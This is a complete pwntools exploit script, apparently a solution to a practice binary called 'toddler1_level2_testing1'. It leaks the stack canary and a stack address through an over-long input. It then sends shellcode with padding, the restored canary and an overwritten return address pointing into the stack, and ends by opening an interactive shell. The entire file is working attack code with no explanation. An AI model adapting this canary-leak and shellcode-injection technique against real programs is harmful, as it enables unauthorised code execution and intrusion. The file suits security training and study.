#!/usr/bin/env python3

from pwn import *

# Create a process
p = process('/toddler1_level2_testing1')

# Send payload size
p.sendline(b"105")

# Send payload
p.send(b"REPEAT" + b"a" * 99)

# Retrieve stack canary
line = p.recvline_startswith(b"You said: ")
stack_canary = int.from_bytes(line[115:122], "little")
log.info("Stack canary: " + hex(stack_canary))

# Retrieve the data that RBP register points to
stack_address = int.from_bytes(line[122:128], "little")
log.info("Stack address: " + hex(stack_address))

# Re-enter function again
# Send payload size
p.sendline(b"128")

# Read an existing shellcode
with open('shellcode-raw', "rb") as f:
    shellcode = f.read()

# Send payload
p.send(shellcode + b"a" * (104 - len(shellcode)) + p64(stack_canary * 256) + b"a" * 8 + p64(stack_address - 0x160))
p.interactive()
